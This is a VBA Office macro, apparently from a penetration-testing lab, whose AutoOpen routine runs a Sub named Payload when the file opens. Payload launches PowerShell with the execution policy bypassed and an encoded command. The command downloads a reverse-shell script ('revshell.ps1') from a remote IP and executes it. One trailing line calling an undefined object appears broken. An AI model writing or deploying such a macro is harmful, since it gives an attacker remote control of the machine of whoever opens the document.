Sub Payload()
    Dim wsh
    Set wsh = CreateObject("Wscript.Shell")
    wsh.Run "powershell -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADUALgAyADAANAA6ADgAMAAvAHIAZQB2AHMAaABlAGwAbAAuAHAAcwAxACcAKQA="
    Set wsh = Nothing
    WshShell.Run
End Sub

Sub AutoOpen()
Payload
End Sub